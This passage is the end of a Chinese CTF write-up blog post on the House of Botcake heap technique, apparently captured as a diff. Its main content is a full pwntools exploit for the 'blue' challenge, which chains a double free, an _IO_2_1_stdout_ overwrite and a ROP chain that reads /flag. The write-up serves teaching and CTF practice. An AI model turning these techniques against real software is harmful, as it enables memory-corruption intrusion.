+<p>在puts时就会泄露出environ了</p>
+<p><img src="https://s2.loli.net/2024/12/02/Kp1GAd2DioMVXEt.png" alt="image" /></p>
+<p>再把目标堆块和辅助堆块free出来进行<strong>伪造chunk</strong></p>
+<p><img src="https://s2.loli.net/2024/12/02/yM59vKfJHLlADwW.png" alt="image" /></p>
+<p><img src="https://s2.loli.net/2024/12/02/sLmuvCORFb1eY9M.png" alt="image" /></p>
+<p><img src="https://s2.loli.net/2024/12/02/ZLnIQCH67a9toM2.png" alt="image" /></p>
+<p><img src="https://s2.loli.net/2024/12/02/cfmaijwQTeP1Z65.png" alt="image" /></p>
+<p>到这就结束啦！</p>
+<h1 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> Payload</h1>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./blue&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28301)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./blue&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">only_UAF</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;idx: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;idx: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;idx: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#house of botcake</span></span><br><span class="line"><span class="comment">#leak_libc</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">b&#x27;a&#x27;</span>) <span class="comment">#0-8</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#9 to avoid being caught by top chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i) <span class="comment">#0-6</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">only_UAF(<span class="number">8</span>) <span class="comment">#this is victim chunk</span></span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x60</span></span><br><span class="line">log.success(<span class="string">&#x27;main_arena==&gt;&#x27;</span> + <span class="built_in">hex</span>(main_arena))</span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&#x27;malloc_hook==&gt;&#x27;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base==&gt;&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">IO_stdout = libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;IO_stdout==&gt;&#x27;</span> + <span class="built_in">hex</span>(IO_stdout))</span><br><span class="line">environ = libc_base + libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;environ==&gt;&#x27;</span> + <span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#leak stack and fake stack chunk</span></span><br><span class="line">delete(<span class="number">7</span>) <span class="comment">#this is prev chunk,which is used to be added with chunk 8,becoming a larger chunk that can be double free</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#0,leave a place to target chunk,index 8</span></span><br><span class="line">delete(<span class="number">8</span>) <span class="comment">#this time,the 8th chunk has been double free,which is in the list of tcache,and it will be used to overwrite the fd of 8th chunk by overlapping</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x70</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(IO_stdout)) <span class="comment">#2,chunk expend,change fd to IO_stdout</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#3,which fd has been changed to IO_stdout,</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x80</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(environ) + p64(environ + <span class="number">8</span>)) <span class="comment">#4,edit IO_stdout to leak stack</span></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;stack==&gt;&#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">stack_base = stack - <span class="number">0x158</span></span><br><span class="line">log.success(<span class="string">&#x27;stack_base==&gt;&#x27;</span> + <span class="built_in">hex</span>(stack_base))</span><br><span class="line">add_ret = stack_base + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&#x27;add_ret==&gt;&#x27;</span> + <span class="built_in">hex</span>(add_ret))</span><br><span class="line">delete(<span class="number">3</span>) <span class="comment">#free victim chunk</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#free the chunk that can change fd of victim chunk</span></span><br><span class="line">add(<span class="number">0x70</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(add_ret)) <span class="comment">#2,fake stack chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#set orw</span></span><br><span class="line">open_addr = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_addr = libc_base + libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x23b6a</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x2601f</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x142c92</span></span><br><span class="line">orw = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span> + p64(pop_rdi) + p64(add_ret) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(stack + <span class="number">0x200</span>) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(stack + <span class="number">0x200</span>) + p64(puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x80</span>,orw) <span class="comment">#4,the stack</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
+<p>这个玩意感觉挺考验细心程度和对堆的理解，一个不留神就会弄错索引，伪造失败。堆好多house啊——<strong>什么时候才有我的house——</strong></p>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="网络安全" data-aos="zoom-in">网络安全</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Heap/" rel="tag" title="Heap">Heap</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag" title="Pwn">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="https://files.seeusercontent.com/2026/05/31/Bk4r/B1D831FFF8E3F21FE96981820E64364C.jpg" data-sizes="auto" alt="LitCTF2024 Pwn方向wp" class="lazyload">
+        <a href="/2024/06/07/LitCTF_wp/" aria-label="前一篇: LitCTF2024 Pwn方向wp" title="前一篇: LitCTF2024 Pwn方向wp"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            LitCTF2024 Pwn方向wp
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="https://files.seeusercontent.com/2026/05/31/Nme8/D7371DB5479D79B17E7CF2A1272B4691.jpg" data-sizes="auto" alt="劫持_IO_file_jumps&amp;environ" class="lazyload">
+      <a href="/2024/05/11/%E5%8A%AB%E6%8C%81_IO_file_jumps%E6%94%BB%E5%87%BB%E5%92%8Cenviron%E6%94%BB%E5%87%BB/" aria-label="后一篇: 劫持_IO_file_jumps&amp;environ"  title="后一篇: 劫持_IO_file_jumps&amp;environ"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          劫持_IO_file_jumps&amp;environ
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2023-2026
+        <span class="footer-info-sep "></span>
+      Dusk
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        44.3k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        03:24
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi "></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text"> 个人理解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-botcake"><span class="toc-number">2.</span> <span class="toc-text"> House of Botcake</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#_io_file"><span class="toc-number">2.1.</span> <span class="toc-text"> _IO_FILE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%84"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#_flag%E8%AF%A6%E6%83%85"><span class="toc-number">2.1.2.</span> <span class="toc-text"> _flag详情</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A"><span class="toc-number">2.1.3.</span> <span class="toc-text"> 解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.</span> <span class="toc-text"> 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E8%87%B4%E6%80%9D%E8%B7%AF"><span class="toc-number">2.3.</span> <span class="toc-text"> 大致思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98ciscn-2022-%E5%8D%8E%E4%B8%9C%E5%8C%97blue"><span class="toc-number">2.4.</span> <span class="toc-text"> 例题：[CISCN 2022 华东北]blue</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.4.1.</span> <span class="toc-text"> 代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">2.4.1.1.</span> <span class="toc-text"> main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#add"><span class="toc-number">2.4.1.2.</span> <span class="toc-text"> add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#delete"><span class="toc-number">2.4.1.3.</span> <span class="toc-text"> delete</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#show"><span class="toc-number">2.4.1.4.</span> <span class="toc-text"> show</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#only_uaf"><span class="toc-number">2.4.1.5.</span> <span class="toc-text"> only_UAF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.4.2.</span> <span class="toc-text"> 思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E8%B0%83"><span class="toc-number">2.4.3.</span> <span class="toc-text"> 动调</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#payload"><span class="toc-number">3.</span> <span class="toc-text"> Payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text"> 总结</span></a></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">16</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/FallingDusky itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-instagram sidebar-social-icon">
+      <a href=https://www.instagram.com/xi_luo_san itemprop="url" target="_blank" aria-label="instagram" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf2dc;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf2dc;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf2dc;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf2dc;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)","#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)","#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+  
+<script src="https://npm.webcache.cn/theme-shokax-pjax@0.0.3/dist/index.umd.js" integrity="sha384-xneY1WY8hOfUzswrE4CrYq35N4BdVcxqxwHPr9zawE&#x2F;jMSCxD+jAPU55x&#x2F;jj3wlf" crossorigin="anonymous"></script>
+
+  
+<script src="/js/pjax.js"></script>
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Dusk",
+          title: "House of Botcake",
+          url: "https://fallingdusky.github.io/2024/05/24/House%20of%20Botcake/",
+          excerpt: "堆的House of Botcake攻击手法，实现double free",
+          description: "",
+          stripContent: " 个人理解 感觉House of Botcake就是double free + overlapping + _IO_FILE attack的结合使用，需要对堆结构有着较为详细的理解，也要有能管理堆顺序的能力，建议写题的时候还是标一标堆的index，这样在利用堆的时候会比较方便些  House of Botcake 想要利用这个攻击，我们得先了解_IO_FILE的结构  _IO_FILE  结构 123456789101112131415161718192021222324252627282930",
+          date: "Fri May 24 2024 22:19:00 GMT+0800",
+          updated: "Mon Dec 02 2024 21:29:38 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.5' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+<script data-pjax>
+  var updateTime = _$('#post-update-time')?.innerHTML;
+
+  if (updateTime) {
+    const update = new Date(updateTime);
+    const now = new Date();
+    const diff = now - update;
+    const days = diff / 86400000;
+    const { daysAgo, message: template } = window.REIMU_CONFIG.outdate;
+    if (days >= daysAgo) {
+      let message = `This article was last updated on ${updateTime}. Please note that the content may no longer be applicable.`;
+      if (typeof template === 'string') {
+        message = template.replace(/{time}/, updateTime);
+      } else if (typeof template === 'object') {
+        const lang = document.documentElement.lang;
+        const messageKey = Object.keys(template).find(key => key.toLowerCase() === lang.toLowerCase());
+        if (messageKey && template[messageKey]) {
+          message = template[messageKey].replace(/{time}/, updateTime);
+        }
+      }
+      const blockquote = _$('#outdate-blockquote');
+      if (blockquote) {
+        blockquote.querySelectorAll('p')[1].innerText = message;
+        blockquote.style.display = 'flow-root';
+      }
+    }
+  }
+</script>
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+    <script>
+      var setupAPlayer = () => {
+        if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+          if (window.matchMedia('(max-width: 959px)').matches) {
+            const meting = _$('meting-js');
+            if (meting) {
+              meting.setAttribute('fixed', 'true');
+              const aside = meting.parentNode?.parentNode;
+              if (aside?.tagName === 'ASIDE') {
+                meting.parentNode.removeChild(meting);
+                document.body.appendChild(meting);
+              }
+            }
+          }
+        }
+      };
+    </script>
+  
+<script src="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.js" integrity="sha384-gdGYZwHnfJM54evoZhpO0s6ZF5BQiybkiyW7VXr+h5UfruuRL&#x2F;aORyw+5+HZoU6e" crossorigin="anonymous" defer onload="setupAPlayer()"></script>
+
+    
+<script src="https://npm.webcache.cn/meting@2.0.1/dist/Meting.min.js" integrity="sha384-ASVlpKF80A22OXTK3tfEjZm1EL6uFMKIC4p8+0maanw1S&#x2F;IyB+Y4JG+ZDU7GpKE8" crossorigin="anonymous" defer></script>
+
+
+
+  </body>
+  </html>
